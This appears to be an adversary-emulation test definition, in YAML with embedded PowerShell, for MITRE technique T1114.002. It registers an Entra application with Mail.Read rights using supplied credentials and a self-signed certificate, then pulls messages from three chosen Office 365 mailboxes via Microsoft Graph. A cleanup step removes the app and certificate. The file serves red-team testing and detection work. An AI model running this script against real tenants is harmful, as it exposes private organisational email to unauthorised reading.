api_version: "2.0"
name: Office365 - Remote Mail Collected
description: "Create and register an entra application that downloads emails from a tenant's Office 365 mailboxes using the Microsoft Graph API app-only access. This can be used by an adversary to collect an organization's sensitive information. \n"
args:
    - name: username
      type: string
      default: <nil>
    - name: password
      type: string
      default: <nil>
    - name: 1st_target_mailbox
      type: string
      default: <nil>
    - name: 2nd_target_mailbox
      type: string
      default: <nil>
    - name: 3rd_target_mailbox
      type: string
      default: <nil>
uuid: 36657d95-d9d6-4fbf-8a31-f4085607bafd
mitre:
    tactics:
        - 'TA0009: Collection'
    techniques:
        - 'T1114: Email Collection'
    subtechniques:
        - 'T1114.002: Remote Email Collection'
requirements:
    platforms:
        - os: office-365
steps:
    - name: |
        Microsoft Graph PowerShell SDK must be installed.
      inline: |
        $RequiredModule = Get-InstalledModule Microsoft.Graph
        if (-not $RequiredModule) {{Install-Module Microsoft.Graph -Scope CurrentUser
        }} else {exit 0}
      executor: powershell
    - name: |
        Az.Accounts module must be installed.
      inline: |
        $RequiredModule2 = Get-InstalledModule Az.Accounts
        if (-not $RequiredModule2) {{Install-Module Az.Accounts -Scope CurrentUser
        }} else {exit 0}
      executor: powershell
    - name: office365---remote-mail-collected
      inline: "$ss = ConvertTo-SecureString \"{{.Args.password}}\" -AsPlainText -Force\n$cred = New-Object PSCredential -ArgumentList '{{.Args.username}}', $ss\n$param = @{\n    Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\"; \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\"; \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\"; \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\"; \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\"; \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\"; \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\" })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\"; Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\n$mailbox1 = \"{{.Args.1st_target_mailbox}}\"\n$mailbox2 = \"{{.Args.2nd_target_mailbox}}\"\n$mailbox3 = \"{{.Args.3rd_target_mailbox}}\"\n[System.Collections.ArrayList]$selectUsers = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n"
      executor: powershell
      cleanup:
        inline: |
            connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome
            Remove-MgApplication $app.AppId
            Remove-Item -Path Cert:\CurrentUser\My\$($cert.thumbprint) -DeleteKey
            Disconnect-MgGraph
        executor: powershell
